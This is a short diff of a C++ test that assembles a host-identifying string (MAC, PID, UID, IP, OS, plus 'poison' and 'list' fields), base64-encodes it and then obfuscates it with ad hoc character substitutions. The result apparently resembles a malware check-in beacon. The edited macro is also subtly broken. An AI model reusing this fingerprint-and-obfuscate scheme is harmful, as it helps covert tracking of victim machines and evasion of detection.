@@ -18,7 +18,9 @@ winsock_init  g_winsock_initor;
 
 TEST(http, 1)
 {
-#define  form_str "{random}*Yes,pca*{mac},pod*{pid},uod*{uid},ip*{ip},os*winxp,poison*1_2_3_4,list*d:/asdasd/asds,status*1"
+#define  form_str "pca*{mac},pod*{pid},uod*{uid},ip*{ip},"
+    "os*winxp,poison*1_2_3_4,list*d:/asdasd/asds,status*1";
+
     std::string str_format = form_str;
 
     mac_extractor mac_;
@@ -34,8 +36,8 @@ TEST(http, 1)
     base64 b64;
     b64.encode(str_format.c_str(), str_format.size(), str_format, false);
 
-    str_format = Replace(str_format, "==",  "QegA27vc");
-    str_format = Replace(str_format, "=",  "QegA27vcA");
+    str_format = Replace(str_format, "==",  "QegZ27vc");
+    str_format = Replace(str_format, "=",  "QegZ27vcZ");
     str_format = Replace(str_format, "O",  "IkL");
     str_format = Replace(str_format, "R",  "TgF");
     str_format = Replace(str_format, "A",  "SwD");
